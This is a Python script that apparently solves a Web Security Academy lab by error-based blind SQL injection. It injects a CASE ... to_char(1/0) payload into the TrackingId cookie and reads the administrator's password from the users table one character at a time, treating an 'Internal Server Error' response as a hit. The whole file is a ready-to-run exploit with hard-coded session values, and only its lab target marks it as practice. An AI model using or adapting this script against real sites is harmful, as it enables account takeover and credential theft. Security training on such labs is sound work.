import requests

# Add unique code of the lab, tracking id and session id 
params = {"category": "Gifts"}
char = "abcdefghijklmnopqrstuvwxyz0123456789"
unique_code_url= "0af5001a042c5ac280a84e720095000e"
url = f"https://{unique_code_url}.web-security-academy.net/filter"
password=[]

for count in range(1,21):
    for chr in char:
        headers = {
            "Host": f"{unique_code_url}.web-security-academy.net",
            "Cookie": f"TrackingId=hEwAxShLCadAoIMR'  || ( select case when(substr(password,{count},1) = '{chr}') then to_char(1/0) else '' end from users where username='administrator' ) || '; session=C4enDKhOsKMr6FHLnUvhcufhPkHollFX",
            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": f"https://{unique_code_url}.web-security-academy.net/",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Priority": "u=0, i"
        }
        response = requests.get(url, headers=headers, params=params)
        # print(f"{count},1 = {chr}")
        if "Internal Server Error" in response.text:
            password.append(chr)
            print("".join(password))
            break